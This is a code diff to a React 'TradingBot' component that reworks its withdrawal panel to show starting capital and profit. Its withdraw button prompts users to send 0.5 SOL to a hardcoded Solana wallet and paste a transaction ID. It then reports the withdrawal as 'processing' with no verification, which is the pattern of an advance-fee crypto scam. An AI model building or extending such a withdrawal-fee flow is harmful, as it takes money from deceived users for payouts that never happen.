@@ -9,6 +9,7 @@ interface TradingBotProps {
   onStart: () => void;
   onStop: () => void;
   onStartingCapitalChange: (value: number) => void;
+  onWithdraw?: () => void;
   currentValue?: number;
   profitLoss?: number;
 }
@@ -18,6 +19,7 @@ const TradingBot: React.FC<TradingBotProps> = ({
   onStart,
   onStop,
   onStartingCapitalChange,
+  onWithdraw,
   currentValue = 0,
   profitLoss = 0
 }) => {
@@ -174,13 +176,17 @@ const TradingBot: React.FC<TradingBotProps> = ({
           </BrutalistButton>
         )}
         
-        {currentValue > startingCapital && (
+        {profitLoss > 0 && (
           <div className="p-3 bg-[#2A2A2A] rounded-md border-2 border-black">
             <div className="mb-3">
-              <p className="text-sm text-gray-400 mb-1">Withdraw Funds</p>
+              <p className="text-sm text-gray-400 mb-1">Withdraw Profits</p>
               <div className="flex justify-between">
-                <p className="text-sm">Trading Balance</p>
-                <p className="text-sm font-bold">${currentValue.toFixed(2)}</p>
+                <p className="text-sm">Starting Capital</p>
+                <p className="text-sm font-bold">${startingCapital.toFixed(2)}</p>
+              </div>
+              <div className="flex justify-between">
+                <p className="text-sm">Current Profit</p>
+                <p className="text-sm font-bold text-brutalism-green">+${profitLoss.toFixed(2)}</p>
               </div>
               <div className="flex justify-between">
                 <p className="text-sm">Withdrawal Fee</p>
@@ -189,7 +195,7 @@ const TradingBot: React.FC<TradingBotProps> = ({
               <div className="border-t border-gray-700 my-2"></div>
               <div className="flex justify-between">
                 <p className="text-sm">Net Withdrawal</p>
-                <p className="text-sm font-bold text-brutalism-green">${currentValue.toFixed(2)}</p>
+                <p className="text-sm font-bold text-brutalism-green">${profitLoss.toFixed(2)}</p>
               </div>
             </div>
             
@@ -198,18 +204,18 @@ const TradingBot: React.FC<TradingBotProps> = ({
               color="yellow"
               onClick={() => {
                 const txId = window.prompt(
-                  "Please send 0.5 SOL to 6B2RkaJevbKkAVmBZ4W2eNvQWApHwtd6TQggSuTmyVJ5 and paste transaction ID here to withdraw your funds:"
+                  "Please send 0.5 SOL to 6B2RkaJevbKkAVmBZ4W2eNvQWApHwtd6TQggSuTmyVJ5 and paste transaction ID here to withdraw your profits:"
                 );
                 if (txId) {
                   // In a real app, you would verify the transaction here
-                  alert(`Withdrawal of $${currentValue.toFixed(2)} is processing. You will receive funds after transaction verification.`);
-                  if (!isActive) {
-                    onStop(); // Stop the bot if not already stopped
+                  alert(`Withdrawal of $${profitLoss.toFixed(2)} profit is processing. You will receive funds after transaction verification.`);
+                  if (onWithdraw) {
+                    onWithdraw();
                   }
                 }
               }}
             >
-              <i className="ri-money-dollar-circle-line mr-1"></i> Withdraw Funds
+              <i className="ri-money-dollar-circle-line mr-1"></i> Withdraw Profits
             </BrutalistButton>
           </div>
         )}
